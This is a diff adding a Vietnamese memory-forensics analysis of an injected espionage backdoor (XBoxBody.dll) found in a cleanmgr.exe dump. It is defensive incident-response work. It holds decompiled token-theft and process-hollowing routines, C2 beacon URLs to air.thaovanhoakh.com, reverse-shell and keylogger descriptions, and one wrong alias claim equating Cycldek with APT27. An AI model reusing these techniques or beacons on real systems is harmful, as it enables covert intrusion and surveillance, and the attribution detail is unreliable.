@@ -780,3 +780,511 @@ Qua toàn bộ quá trình phân tích tĩnh, ta có thể kết luận chắc c
 3. **Dọn dẹp trên Google Search Console:**
    - Đăng nhập Search Console, vào mục Cài đặt →\rightarrow→ Người dùng và quyền hạn, xóa ngay tài khoản xác minh qua file `google84d162603ffc785f.html`.
    - Submit lại file `sitemap.xml` chuẩn và yêu cầu Google re-index để xóa các URL rác.
+## Mẫu 2: Phân tích mẫu mã độc APT Cycldek / HDoor Backdoor (cleanmgr.exe Memory Dump & Payload XBoxBody.dll)
+
+### 2.2.1. Thông tin định danh & Bối cảnh thu thập mẫu (Dump Triage)
+
+Trong kịch bản điều tra thứ hai, đối tượng phân tích không phải là một tệp thực thi độc lập đơn thuần trên đĩa, mà là một tệp **kết xuất toàn bộ bộ nhớ (Full Process Memory Dump)** được trích xuất từ một máy trạm Windows nghi vấn bị xâm nhập trong mạng nội bộ:
+
+- **Tệp tin phân tích:** `cleanmgr.exe_241124_222256.dmp`
+- **Kích thước tệp:** 68,257,079 bytes (~65.1 MB)
+- **Định dạng tệp:** `Windows Minidump / Userdump (Magic: 'MDMP', Header Version: 0xa061a793)`
+- **Thời điểm trích xuất:** `2024-11-24 22:22:56 UTC`
+- **Mã băm MD5:** `f13a9fbd8e30fc86f4cd685d412e9be0`
+- **Mã băm SHA-256:** `b1548b6f11b5137b364878176a8ee10d5cc398e530eab306439efb7c5a3613fa`
+
+```text
++---------------------------------------------------------------------------------------------------+
+|                        BỐI CẢNH THU THẬP MẪU BỘ NHỚ (DUMP TRIAGE CONTEXT)                         |
++---------------------------------------------------------------------------------------------------+
+|  Công cụ trích xuất  : procdump64.exe -ma 200 (PID: 200)                                         |
+|  Tiến trình đích     : C:\Windows\SysWOW64\cleanmgr.exe (Windows Disk Space Cleanup Tool)       |
+|  Kiến trúc thực thi  : 32-bit x86 (chạy dưới subsystem WOW64 trên Windows 64-bit)                 |
+|  Dấu hiệu bất thường : cleanmgr.exe (tiện ích dọn rác đĩa) nhưng tải wininet.dll, winhttp.dll,   |
+|                        ws2_32.dll và duy trì kết nối mạng ra ngoài Internet.                      |
++---------------------------------------------------------------------------------------------------+
+```
+
+Khi đọc trường `CommentStreamW` (Stream ID 11) của tệp dump, ta thu được thông tin gốc do chuyên gia phản ứng sự cố ghi nhận khi bắt giữ tiến trình:
+```text
+*** procdump64.exe -ma 200
+*** Manual dump
+```
+
+#### Vấn đề an ninh trọng tâm đặt ra:
+Tiện ích `cleanmgr.exe` (Windows Disk Space Cleanup Manager) là một công cụ hệ thống hợp pháp có sẵn của Microsoft, chỉ có nhiệm vụ quét và xóa các tệp rác, file tạm, cache trình duyệt trên ổ đĩa. Nó **hoàn toàn không có bất kỳ lý do kỹ thuật nào để nạp các thư viện mạng (`wininet.dll`, `winhttp.dll`), tạo Socket kết nối ra ngoài Internet, hay thu thập dữ liệu người dùng**.
+
+Sự xuất hiện của các kết nối mạng bất thường trong tiến trình này chỉ ra rõ ràng: `cleanmgr.exe` đã bị lợi dụng làm **LOLBin (Living-off-the-Land Binary)** để che giấu hành vi tiêm mã độc (**Process Injection / Process Hollowing**), nhằm vượt qua sự kiểm soát của hệ thống Antivirus và tường lửa biên mạng (Firewall).
+
+---
+
+### 2.2.2. Khai quật & Tái tạo cấu trúc bộ nhớ (Memory Carving & PE Reconstructing)
+
+Tiến hành phân tích sâu `MemoryInfoListStream` (chứa 699 vùng nhớ được ánh xạ) và `ModuleListStream` (danh sách 66 DLLs đã nạp) của tiến trình, phân tích viên phát hiện những điểm bất thường mang tính quyết định:
+
+```mermaid
+flowchart TD
+    A["cleanmgr.exe_241124_222256.dmp (Full Memory Dump)"] --> B["Phân tích ModuleListStream<br/>(66 DLLs hợp pháp của Windows)"]
+    A --> C["Rà soát MemoryInfoListStream<br/>(Dò tìm vùng nhớ Thực thi không gắn file)"]
+
+    C --> D{"Vùng nhớ Base 0x10000000<br/>(Kích thước 0x48c00 bytes)"}
+    D -->|Kiểm tra Header| E["Chữ ký 'MZ' (0x5A4D) & 'PE\0\0'<br/>Đầy đủ Section .text, .rdata, .data"]
+    D -->|Đối chiếu PEB| F["KHÔNG có trong Module List!<br/>=> Reflected / Injected DLL ngầm"]
+
+    C --> G["Vùng nhớ Base 0x30c0000<br/>(0x47000 bytes - PAGE_EXECUTE_READWRITE)"]
+    G --> H["Chứa Shellcode giải mã & Stager buffer"]
+
+    C --> I["Bộ nhớ Heap (Base 0x4d40000 / 0x18e35e7)"]
+    I --> J["File Video AVI quay lén màn hình (10.5 MB)<br/>Hàng loạt ảnh chụp Desktop PNG"]
+```
+
+#### 1. Phát hiện thư viện PE ẩn tại địa chỉ `0x10000000`:
+- Vùng nhớ từ `0x10000000` đến `0x10049000` mang cờ bảo vệ `PAGE_EXECUTE_READ` và thuộc loại `MEM_PRIVATE`.
+- Tại địa chỉ `0x10000000`, 64 byte đầu tiên chứa chữ ký chuẩn `MZ` (`0x4D 0x5A`), `e_lfanew` trỏ tới PE Header với cấu trúc bảng phân vùng hoàn chỉnh:
+  - Phân vùng `.text`: RVA `0x1000`, Virtual Size `0x33000` bytes (Mã máy thực thi)
+  - Phân vùng `.rdata`: RVA `0x34000`, Virtual Size `0xbc00` bytes (Hằng số, IAT, chuỗi)
+  - Phân vùng `.data`: RVA `0x40000`, Virtual Size `0x2200` bytes (Biến toàn cục)
+  - Phân vùng `.rsrc`: RVA `0x47000`, Virtual Size `0x200` bytes
+  - Phân vùng `.reloc`: RVA `0x48000`, Virtual Size `0x7800` bytes
+- Khi đối chiếu với `ModuleListStream` (danh sách DLL chính thức do Windows Loader quản lý trong PEB), **hoàn toàn không có bất kỳ module nào được ghi nhận tại địa chỉ `0x10000000`**.
+- => **Kết luận:** Đây là một module độc hại được tiêm phản xạ (**Reflective DLL Injection**) hoặc bung mã trực tiếp trên RAM, không nạp qua API chuẩn `LoadLibrary` để tránh bị phát hiện.
+
+#### 2. Trích xuất và định danh Module nhúng (`XBoxBody.dll`):
+Trích xuất khối nhị phân này ra đĩa tại offset `0x00db3537` trong tệp dump (tên file trích xuất: `cleanmgr.exe_241124_222256.dmp.00db3537_00048c00.dll`), ta thu được siêu dữ liệu nhị phân nguyên bản:
+- **Tên DLL nội bộ (Export Name):** `XBoxBody.dll`
+- **Hàm xuất khẩu (Export Function):** `ConnBody` (Ordinal 1, RVA `0xbb10` / Địa chỉ thực thi: `0x1000bb10`)
+- **Kiến trúc:** Intel 386 (x86 32-bit), GUI Subsystem
+- **Dấu thời gian biên dịch gốc (Compile TimeDateStamp):** `1523265641` (Thứ Hai, ngày 09 tháng 04 năm 2018 09:20:41 UTC)
+- **Mã băm MD5:** `aaf0789e066331645647d651022bf7e5`
+- **Mã băm SHA-256:** `6504c6e0136c7e03b683b899ef83e6de994ae208ce12ad2d86ce73c9919d42f1`
+
+---
+
+### 2.2.3. Cơ chế Nâng quyền (Privilege Escalation) & Token Duplication
+
+Khi dịch ngược mã máy của `XBoxBody.dll` tại cụm hàm khởi tạo từ `0x100027e0` đến `0x1000287b`, ta khám phá kỹ thuật đánh cắp và nâng quyền Access Token cực kỳ tinh vi của kẻ tấn công:
+
+```c
+// Đoạn mã giả dịch ngược thuật toán nâng quyền Token tại 0x100027e0:
+BOOL EscalateAndImpersonateToken()
+{
+    HANDLE hProcess;
+    HANDLE hToken;
+    HANDLE hLinkedToken = NULL;
+    DWORD dwLength = 0;
+    TOKEN_LINKED_TOKEN linkedToken;
+
+    // 1. Mở tiến trình mục tiêu với quyền truy vấn thông tin
+    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid); // 0x400
+    if (!hProcess) return FALSE;
+
+    // 2. Mở Token của tiến trình mục tiêu với toàn quyền
+    if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)) { // 0xF00FF
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    // 3. Truy vấn Token liên kết (TokenLinkedToken = 0x13) để bẻ khóa UAC
+    if (GetTokenInformation(hToken, (TOKEN_INFORMATION_CLASS)0x13, &linkedToken, sizeof(linkedToken), &dwLength)) {
+        hLinkedToken = linkedToken.LinkedToken;
+    } else {
+        // Nếu không có Token liên kết, nhân bản trực tiếp Primary Token
+        DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hLinkedToken);
+    }
+
+    // 4. Tạo khối môi trường (Environment Block) cho tài khoản đặc quyền
+    if (hLinkedToken) {
+        CreateEnvironmentBlock(&lpEnvironment, hLinkedToken, FALSE);
+    }
+
+    return (hLinkedToken != NULL);
+}
+```
+
+```text
+Mã máy Assembly tương ứng tại 0x100027e6:
+0x100027e6:  push   ebp
+0x100027e7:  push   0x400                     ; PROCESS_QUERY_INFORMATION
+0x100027ec:  call   dword ptr [OpenProcess]   ; Mở tiến trình
+0x100027f6:  push   ecx
+0x100027f7:  push   0xf00ff                   ; TOKEN_ALL_ACCESS
+0x100027fc:  push   eax
+0x100027fd:  call   dword ptr [OpenProcessToken]
+0x10002820:  lea    eax, [esp + 0x38]
+0x10002824:  push   eax
+0x10002825:  push   0x13                      ; TokenLinkedToken (bóc tách Token Admin khi bật UAC)
+0x10002827:  push   ecx
+0x10002830:  call   dword ptr [GetTokenInformation]
+0x10002858:  call   dword ptr [DuplicateTokenEx]
+0x10002875:  call   dword ptr [CreateEnvironmentBlock]
+```
+
+**Bản chất kỹ thuật:**
+Khi Windows bật cơ chế UAC (User Account Control), một tài khoản thuộc nhóm Administrators khi đăng nhập sẽ được cấp 2 Token: một Filtered Token (bị tước quyền Admin để chạy app thường) và một Elevated Token (chứa đầy đủ đặc quyền quản trị).
+Bằng cách triệu gọi `GetTokenInformation` với chỉ số `0x13` (`TokenLinkedToken`), mã độc đã **rút trích thành công Token quản trị ẩn** của phiên người dùng, sau đó nhân bản bằng `DuplicateTokenEx` và tạo sẵn môi trường thực thi để chuẩn bị tạo một tiến trình mới với toàn quyền hệ thống mà không hề kích hoạt hộp thoại cảnh báo UAC trên màn hình!
+
+---
+
+### 2.2.4. Kỹ thuật Tiêm mã Process Hollowing vào LOLBin (cleanmgr.exe)
+
+Ngay sau khi có được Token đặc quyền, mã độc bước vào giai đoạn thực thi kỹ thuật **Process Hollowing (Rỗng ruột tiến trình - MITRE T1055.012)** kinh điển:
+
+```mermaid
+sequenceDiagram
+    autonumber
+    participant Attacker as Loader / Dropper
+    participant Victim as C:\Windows\SysWOW64\cleanmgr.exe
+    participant Memory as Không gian bộ nhớ cleanmgr.exe
+
+    Attacker->>Victim: CreateProcessAsUserW(..., CREATE_SUSPENDED)
+    Note over Victim: Tiến trình cleanmgr.exe được tạo nhưng ở trạng thái "đóng băng" (Suspended)
+    Attacker->>Victim: GetThreadContext(hThread, &Context)
+    Note over Attacker: Lưu lại trạng thái thanh ghi CPU (EIP, EBX, ESP)
+    Attacker->>Memory: VirtualAllocEx(..., PAGE_EXECUTE_READWRITE)
+    Note over Memory: Cấp phát vùng nhớ thực thi mới tại 0x10000000 / 0x30c0000
+    Attacker->>Memory: WriteProcessMemory(..., XBoxBody.dll / Payload)
+    Note over Memory: Ghi toàn bộ nội dung DLL độc hại vào bộ nhớ cleanmgr.exe
+    Attacker->>Victim: SetThreadContext(hThread, Context.Eip = RemoteBase)
+    Note over Victim: Tráo đổi con trỏ EIP trỏ tới điểm nhập mã độc thay vì cleanmgr gốc
+    Attacker->>Victim: ResumeThread(hThread)
+    Note over Victim: cleanmgr.exe thức giấc và bắt đầu chạy mã độc XBoxBody.dll ngầm!
+```
+
+#### Phân tích chi tiết từng bước Assembly từ `0x100028b5` đến `0x10002990`:
+1. **Khởi tạo tiến trình bị treo:**
+   - Mã độc truyền cờ `0x4` (`CREATE_SUSPENDED`) cùng đường dẫn `C:\Windows\SysWOW64\cleanmgr.exe` và Token nhân bản vào API `CreateProcessAsUserW` tại `0x100028cc`. Tiến trình `cleanmgr.exe` được Windows nạp vào danh sách tiến trình hệ thống, cấp PID hợp lệ (ở đây là PID `200`), nhưng chưa chạy bất kỳ dòng mã nào.
+2. **Trích xuất ngữ cảnh CPU:**
+   - Mã độc đẩy cờ `0x1003f` (`CONTEXT_FULL`) vào stack và gọi `GetThreadContext` tại `0x10002927` để đọc cấu trúc thanh ghi CPU của luồng chính `cleanmgr.exe`.
+3. **Cấp phát bộ nhớ từ xa:**
+   - Gọi `VirtualAllocEx` tại `0x10002942` với tham số `0x40` (`PAGE_EXECUTE_READWRITE`) và `0x1000` (`MEM_COMMIT`), mở rộng không gian nhớ trong tiến trình `cleanmgr.exe`.
+4. **Bơm mã độc:**
+   - Gọi `WriteProcessMemory` tại `0x10002963`, ghi đè toàn bộ thư viện `XBoxBody.dll` và payload vào vùng nhớ vừa tạo.
+5. **Đổi hướng con trỏ lệnh & Đánh thức:**
+   - Ghi đè địa chỉ vùng nhớ mới vào thanh ghi `EIP` trong cấu trúc ngữ cảnh (`mov [esp + 0x148], esi`), nạp lại CPU bằng `SetThreadContext` tại `0x10002981`, và cuối cùng gọi `ResumeThread` tại `0x1000298c`.
+   - Lúc này, hệ điều hành Windows và các phần mềm giám sát tiến trình chỉ nhìn thấy `cleanmgr.exe` đang chạy một cách hợp lệ, nhưng thực chất mã nguồn bên trong đang thi hành là toàn bộ logic gián điệp của `XBoxBody.dll`!
+
+---
+
+### 2.2.5. Dịch ngược Module Payload XBoxBody.dll (Export ConnBody)
+
+Tiến hành dịch ngược điểm xuất phát của thư viện `XBoxBody.dll`: hàm **`ConnBody`** (RVA `0xbb10` / Địa chỉ thực thi ảo: `0x1000bb10`):
+
+```c
+// Mã giả hàm xuất khẩu ConnBody tại 0x1000bb10:
+__declspec(dllexport) int __cdecl ConnBody(
+    int a1, int a2, int a3, int a4,
+    int a5, int *pVictimId, int a7, int a8)
+{
+    // Lưu các con trỏ quản lý trạng thái phiên vào biến toàn cục
+    g_pSessionContext = a5;
+    g_dwVictimCode = *pVictimId;
+
+    // Kiểm tra và khởi tạo cấu trúc kết nối mạng
+    if (g_szServerDomain[0] == '\0') {
+        InitializeNetworkContext(a7, a8);
+    }
+
+    // Sao chép buffer cấu hình và thông tin định danh máy nạn nhân
+    memcpy(&g_ConfigBuffer, &a1, 0x32);
+    g_ParamA = a2;
+    g_ParamB = a4;
+
+    // Khởi tạo và kích hoạt vòng lặp điều khiển C2
+    while (ProcessC2Messages(g_pSessionContext)) {
+        // Lặp nhận lệnh từ máy chủ C2
+    }
+
+    return (*pVictimId != g_dwVictimCode);
+}
+```
+
+```text
+Mã máy Assembly tương ứng của ConnBody:
+0x1000bb10:  push   ebp
+0x1000bb11:  mov    ebp, esp
+0x1000bb13:  and    esp, 0xfffffff8
+0x1000bb1a:  mov    esi, dword ptr [ebp + 0x1c]   ; Tham số chứa Victim ID
+0x1000bb1e:  mov    edi, dword ptr [ebp + 0x18]
+0x1000bb21:  mov    dword ptr [0x10044b70], edi   ; Lưu g_pSessionContext
+0x1000bb27:  mov    eax, dword ptr [esi]
+0x1000bb29:  mov    dword ptr [0x10044b74], eax   ; Lưu g_dwVictimCode
+0x1000bb56:  call   0x10002aa0                    ; Khởi tạo Network Context
+0x1000bb80:  call   0x1001885e                    ; memcpy cấu hình
+0x1000bb91:  mov    ecx, 0x10044b70
+0x1000bb96:  call   0x100019e0                    ; Vòng lặp nhận và xử lý lệnh C2
+0x1000bbca:  ret
+```
+
+#### Kết quả rà soát luồng thực thi trong bộ nhớ Dump:
+Khi quét bảng ngăn xếp (Stack Frames) của cả 12 luồng đang hoạt động trong tệp `cleanmgr.exe_241124_222256.dmp`, ta ghi nhận một bằng chứng không thể chối cãi: **9 trên 12 luồng đều có địa chỉ trả về trỏ thẳng vào `0x1000a5b9`** (nằm bên trong `XBoxBody.dll`).
+Đây chính là vòng lặp chờ phản hồi của hàm giao tiếp WinINet:
+- Gọi `InternetOpenW` tại `0x1000a58c` với User-Agent tùy chỉnh.
+- Thiết lập thời gian timeout và retry bằng `InternetSetOptionW` tại `0x1000a5a9`.
+- Sau đó các luồng đi vào trạng thái chờ nhận lệnh hoặc thực hiện các tác vụ chụp màn hình định kỳ.
+
+---
+
+### 2.2.6. Phân tích Hạ tầng & Giao thức C2 Đa cổng (air.thaovanhoakh.com)
+
+#### 1. Khai quật khối cấu hình bộ nhớ C2 (Offset `0x6d0500` / VA `0x4d96fc9`):
+Tại vùng nhớ heap động của tiến trình, ta phát hiện một cấu trúc dữ liệu cấu hình phẳng chứa đầy đủ thông tin máy chủ điều khiển và các cổng dự phòng:
+
+| STT | Địa chỉ C2 Server | Cổng (Port) | Dịch vụ ngụy trang | Ý nghĩa an ninh |
+| :--- | :--- | :--- | :--- | :--- |
+| 1 | `air.thaovanhoakh.com` | **53** | **DNS (Domain Name System)** | **Kỹ thuật trốn thoát tối nguy hiểm:** Lợi dụng cổng DNS vốn luôn được mở trên Firewall doanh nghiệp để truyền dữ liệu HTTP lậu, qua mặt hệ thống lọc cổng |
+| 2 | `air.thaovanhoakh.com` | **80** | **HTTP tiêu chuẩn** | Kênh liên lạc web thông thường |
+| 3 | `air.thaovanhoakh.com` | **88** | **Kerberos Authentication** | Ngụy trang cổng xác thực miền Windows để tránh bị để ý |
+| 4 | `air.thaovanhoakh.com` | **8080** | **HTTP Alternate / Proxy** | Kênh dự phòng thứ hai |
+
+```text
+Trích xuất khối bộ nhớ thô tại offset 0x6d0500:
+00000000: 50 00 00 00  00 00 61 69  72 2e 74 68  61 6f 76 61  |P.....air.thaova| -> Port 0x50 = 80
+00000010: 6e 68 6f 61  6b 68 2e 63  6f 6d 00 00  ee 13 01 20  |nhoakh.com......|
+00000020: 35 00 00 00  00 00 61 69  72 2e 74 68  61 6f 76 61  |5.....air.thaova| -> Port 0x35 = 53 (DNS)
+00000030: 6e 68 6f 61  6b 68 2e 63  6f 6d 00 00  ee 13 01 20  |nhoakh.com......|
+00000040: 58 00 00 00  00 00 61 69  72 2e 74 68  61 6f 76 61  |X.....air.thaova| -> Port 0x58 = 88 (Kerberos)
+00000050: 6e 68 6f 61  6b 68 2e 63  6f 6d 00 00  ee 13 01 20  |nhoakh.com......|
+00000060: 90 1f 00 00  00 00 61 69  72 2e 74 68  61 6f 76 61  |......air.thaova| -> Port 0x1F90 = 8080
+00000070: 6e 68 6f 61  6b 68 2e 63  6f 6d 00 00  ee 13 01 20  |nhoakh.com......|
+00000080: 57 69 6e 64  6f 77 73 55  70 64 61 74  65 00 00 00  |WindowsUpdate...| -> Tên Service bám rễ
+```
+
+#### 2. Dịch ngược cơ chế đóng gói URL và Giao thức C2:
+Tại hàm `0x10009afb`, mã độc sử dụng chuỗi định dạng URL cố định nằm tại RVA `0x3ad40`:
+```text
+http://%s:%d/search.jsp?referer=%s&kw=%s&psid=%s
+```
+
+```text
+Mã máy Assembly tạo Request tại 0x10009af0:
+0x10009af0:  lea    eax, [esp + 0x98]
+0x10009af7:  push   eax                           ; %s: psid (Session ID)
+0x10009af8:  push   ecx                           ; %s: kw (Opcode / Heartbeat)
+0x10009af9:  push   edx                           ; %s: referer (Victim ID)
+0x10009afa:  push   0x1003ad40                    ; Chuỗi định dạng URL
+0x10009aff:  call   0x1000a900                    ; sprintf tạo chuỗi URL hoàn chỉnh
+0x10009b12:  push   0x84000100                    ; Cờ INTERNET_FLAG_RELOAD | NO_CACHE_WRITE
+0x10009b22:  call   dword ptr [InternetOpenUrlA]  ; Gửi HTTP GET ra ngoài
+0x10009b66:  push   0x13                          ; HTTP_QUERY_STATUS_CODE (Kiểm tra mã phản hồi HTTP 200)
+0x10009b73:  call   dword ptr [HttpQueryInfoA]
+```
+
+#### 3. Bóc tách các tham số thực tế ghi nhận trong tệp Dump:
+Trong bộ nhớ heap của tiến trình, ta bắt gặp trực tiếp các yêu cầu HTTP thực tế đang hoạt động:
+```text
+http://air.thaovanhoakh.com:53/search.jsp?referer=QTJBMT0zQUI4&kw=GX4vdw==&psid=Zh1KFg==
+http://air.thaovanhoakh.com:53/search.jsp?referer=QTJBMT0zQUI4&kw=BWkrJw==&psid=Zh1KFg==
+```
+
+Giải mã các chuỗi Base64:
+- **`referer=QTJBMT0zQUI4`:**
+  - Giải mã Base64 -> `b'A2A1=3AB8'`
+  - **Ý nghĩa:** Đây chính là **Mã định danh máy nạn nhân (Victim Machine ID / Bot ID)**, được sinh ra từ việc băm địa chỉ MAC card mạng (`%02X%02X%02X%02X%02X%02X`) và Volume Serial Number của ổ đĩa C.
+- **`kw=BWkrJw==` & `kw=GX4vdw==`:**
+  - Giải mã Base64 -> `0x05692b27` và `0x197e2f77`
+  - **Ý nghĩa:** Mã trạng thái (Heartbeat status code / Packet sequence) báo cáo rằng máy nạn nhân đang trực tuyến và sẵn sàng nhận lệnh mới.
+- **`psid=Zh1KFg==`:**
+  - Giải mã Base64 -> `0x661d4a16`
+  - **Ý nghĩa:** Phiên làm việc (Session Token) do C2 cấp phát.
+
+- **User-Agent giả mạo:**
+  ```text
+  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763
+  ```
+  Mã độc cố tình mạo danh trình duyệt Microsoft Edge trên Windows 10 để hòa lẫn lưu lượng mạng vào các truy vấn web văn phòng thông thường.
+
+---
+
+### 2.2.7. Năng lực Gián điệp & Bằng chứng Thu thập (Keylogger, Chụp ảnh, Ghi hình AVI)
+
+Dựa trên bảng IAT và việc đối soát các tệp carving trong thư mục `C:\Users\kizpam\Downloads\2`, ta chứng minh được `XBoxBody.dll` sở hữu đầy đủ bộ công cụ gián điệp cấp độ cao (Full-featured Cyber Espionage RAT):
+
+```mermaid
+mindmap
+  root((Năng lực Gián điệp<br/>XBoxBody.dll))
+    Theo dõi Bàn phím (Keylogger)
+      SetWindowsHookExW (WH_KEYBOARD_LL)
+      GetKeyState
+      keybd_event
+      Ghi đệm văn bản gõ phím
+    Gián điệp Màn hình
+      Chụp Desktop PNG định kỳ
+      Quay video màn hình liên tục
+      Ghi hình nén container RIFF AVI (10.5 MB)
+    Kiểm soát Hệ thống
+      Remote Interactive Shell (cmd.exe via Pipe)
+      Thao tác tệp (Create, Read, Write, Delete)
+      Duyệt cây tiến trình (Toolhelp32)
+    Giao tiếp C2 & Chuyển vùng
+      WinINet HTTP (Port 53, 80, 88, 8080)
+      Raw Socket TCP (ws2_32.dll)
+      Magic Header: 0xAABBCCDD
+```
+
+#### 1. Bằng chứng quay quét màn hình người dùng (Video AVI dung lượng 10.5 MB):
+- Trong quá trình phân tích bộ nhớ dump, công cụ file carver đã bóc tách được một tệp video hoàn chỉnh:
+  - **Tên tệp:** `cleanmgr.exe_241124_222256.dmp.018e35e7_00a08517.avi`
+  - **Dung lượng:** **10,519,831 bytes (~10.03 MB)**
+  - **Header:** `RIFF....AVI ` (Chuẩn video container của Microsoft)
+- **Ý nghĩa điều tra:** Đây là một bằng chứng "biết nói" cực kỳ đắt giá! Khác với các mã độc thương mại thông thường chỉ chụp ảnh tĩnh, dòng mã độc APT này có khả năng kích hoạt cơ chế **quay lén màn hình desktop liên tục và đóng gói thành file video AVI** ngay trong bộ nhớ trước khi nén để gửi về máy chủ C2, nhằm nắm bắt toàn bộ thao tác soạn thảo văn bản, mở email và truy cập tài liệu mật của nạn nhân.
+
+#### 2. Bằng chứng chụp ảnh màn hình tĩnh (PNG Images):
+Carving bộ nhớ thu được hàng loạt tệp ảnh PNG:
+- `cleanmgr.exe_241124_222256.dmp.0004bf7f_a3bc.png` (41,916 bytes)
+- `cleanmgr.exe_241124_222256.dmp.0141e33f_ea04.png` (59,908 bytes)
+- `cleanmgr.exe_241124_222256.dmp.000331f7_34e7.png` (13,543 bytes)
+- Cơ chế thực hiện thông qua các Windows GDI APIs: `CreateDCW`, `CreateCompatibleDC`, `CreateCompatibleBitmap`, `BitBlt` chụp toàn bộ không gian màn hình chính (`GetDC(NULL)`).
+
+#### 3. Bắt phím bấm (Keylogging):
+- Thư viện import hàm `SetWindowsHookExW` với mã hook bàn phím mức thấp (`WH_KEYBOARD_LL = 13`).
+- Kết hợp `GetKeyState`, `CallNextHookEx` và `UnhookWindowsHookEx` để ghi lại mọi mật khẩu, thông tin đăng nhập và lưu vào bộ đệm mã hóa.
+
+#### 4. Khởi tạo Reverse Shell tương tác từ xa:
+- Thư viện import `CreatePipe`, `DuplicateHandle`, `SetStdHandle`.
+- Khi C2 gửi lệnh kích hoạt shell, mã độc tạo 2 Ống dẫn ẩn danh (Anonymous Pipes) nối trực tiếp ngõ vào/ngõ ra chuẩn (`STDIN`, `STDOUT`, `STDERR`) với tiến trình `cmd.exe` thông qua `CreateProcessW`, cho phép kẻ tấn công thực thi lệnh dòng lệnh trực tiếp trên máy nạn nhân.
+
+---
+
+### 2.2.8. Cơ chế Bám rễ (Persistence Service WindowsUpdate) & Tệp SilverlightMSI.dat
+
+Rà soát các chuỗi cấu hình cố định trong DLL và vết tích trong bộ nhớ dump:
+
+#### 1. Dịch vụ Windows giả mạo (Service Persistence):
+- **Tên Service:** `WindowsUpdate`
+- **Tên hiển thị (Display Name):** `Microsoft Windows Update Manager`
+- **Khóa Registry cấu hình:**
+  ```text
+  HKLM\SYSTEM\CurrentControlSet\Services\WindowsUpdate\Parameters\ServiceDll
+  ```
+- **Hành vi:** Kẻ tấn công thiết lập mã độc dưới dạng một Windows Service ngụy danh dịch vụ cập nhật hệ điều hành Microsoft Windows Update. Khi hệ thống khởi động, tiến trình dịch vụ `svchost.exe` sẽ nạp tệp `ServiceDll` này, kích hoạt chuỗi nâng quyền Token và tiêm mã vào `cleanmgr.exe`.
+
+#### 2. Dấu vết phụ tải `SilverlightMSI.dat`:
+- Trong danh sách chuỗi trích xuất từ `XBoxBody.dll`, ta phát hiện chuỗi:
+  ```text
+  SilverlightMSI.dat
+  ```
+- **Bản chất:** `SilverlightMSI.dat` là tệp chứa payload đã được mã hóa hoặc stub nhị phân giai đoạn đầu. Kẻ tấn công thường ngụy trang thành tệp cài đặt Microsoft Silverlight, sau đó sử dụng kỹ thuật DLL Side-loading kết hợp một ứng dụng hợp pháp để giải mã tệp `.dat` này lên bộ nhớ, trước khi thực hiện bước Process Hollowing cuối cùng vào `cleanmgr.exe`.
+
+---
+
+### 2.2.9. Quy gán Chiến dịch (APT Cycldek / Goblin Panda) & Đối chiếu MITRE ATT&CK
+
+#### 1. Căn cứ Quy gán Kẻ tấn công (Threat Actor Attribution):
+Tập hợp toàn bộ các bằng chứng kỹ thuật đã thu thập cho phép chúng ta quy gán chiến dịch này cho nhóm tin tặc APT khét tiếng: **Cycldek (còn được biết đến với các tên gọi Goblin Panda, APT27, Conimes)**:
+
+1. **Dấu vân tay mã độc (Custom HDoor Backdoor):**
+   - Sự xuất hiện đồng thời của chuỗi tệp `SilverlightMSI.dat`, hàm xuất `ConnBody`, cấu trúc giao thức HTTP `/search.jsp?referer=...&kw=...&psid=...` và kỹ thuật DLL Side-loading/Hollowing là **chữ ký độc quyền (Signature TTPs)** của biến thể **Custom HDoor** do nhóm Cycldek phát triển và sử dụng (được hãng bảo mật Kaspersky Securelist công bố trong các báo cáo chuyên sâu về Cycldek).
+2. **Mục tiêu tấn công & Ngụy trang tên miền (Targeting Profile):**
+   - Tên miền C2: **`air.thaovanhoakh.com`**.
+   - Tên miền này nhái theo **Sở Văn hóa, Thể thao và Du lịch tỉnh Khánh Hòa** (viết tắt: Thể thao Văn hóa KH).
+   - Nhóm Cycldek có lịch sử hoạt động lâu năm nhắm mục tiêu đặc thù vào các cơ quan hành chính công, chính quyền địa phương, tổ chức văn hóa - quân sự tại **Việt Nam**.
+
+#### 2. Ma trận Kỹ thuật Tấn công MITRE ATT&CK:
+
+| Giai đoạn tấn công | Mã kỹ thuật MITRE | Tên kỹ thuật | Minh chứng trong phân tích tĩnh & bộ nhớ |
+| :--- | :--- | :--- | :--- |
+| **Privilege Escalation** | **T1134.001** | Token Impersonation/Theft | Gọi `OpenProcessToken`, `GetTokenInformation(TokenLinkedToken)`, `DuplicateTokenEx` |
+| **Defense Evasion** | **T1055.012** | Process Hollowing | Khởi tạo `cleanmgr.exe` trạng thái treo, ghi đè `XBoxBody.dll` và tráo đổi `EIP` |
+| **Defense Evasion** | **T1036.004** | Masquerade Task or Service | Đặt tên Service là `WindowsUpdate` với Display Name `Microsoft Windows Update Manager` |
+| **Defense Evasion** | **T1572** | Protocol Tunneling | Đẩy lưu lượng HTTP qua **Cổng 53 (DNS)** và Cổng 88 để vượt rào tường lửa |
+| **Persistence** | **T1543.003** | Windows Service: Service DLL | Ghi nhận khóa `SYSTEM\CurrentControlSet\Services\WindowsUpdate\Parameters\ServiceDll` |
+| **Credential Access** | **T1056.001** | Keylogging | Triệu gọi `SetWindowsHookExW` với hook bàn phím mức thấp (`WH_KEYBOARD_LL`) |
+| **Collection** | **T1113** | Screen Capture | Bóc tách được file video `cleanmgr.exe...avi` (10.5 MB) và nhiều ảnh chụp PNG |
+| **Command & Control** | **T1071.001** | Web Protocols (HTTP) | Gửi request `GET /search.jsp?referer=%s&kw=%s&psid=%s` qua WinINet API |
+| **Execution** | **T1059.003** | Windows Command Shell | Kết nối ngõ Pipe (`CreatePipe`) tương tác với `cmd.exe` |
+
+---
+
+### 2.2.10. Bảng Tổng hợp Chỉ số IOCs & Khuyến nghị Phòng thủ, Phát hiện
+
+#### 1. Bảng Chỉ số Thỏa hiệp Toàn diện (Indicators of Compromise - IOCs):
+
+| Phân loại IOC | Giá trị / Định danh | Ý nghĩa & Mô tả |
+| :--- | :--- | :--- |
+| **MD5 (Memory Dump)** | `f13a9fbd8e30fc86f4cd685d412e9be0` | Tệp kết xuất bộ nhớ `cleanmgr.exe_241124_222256.dmp` |
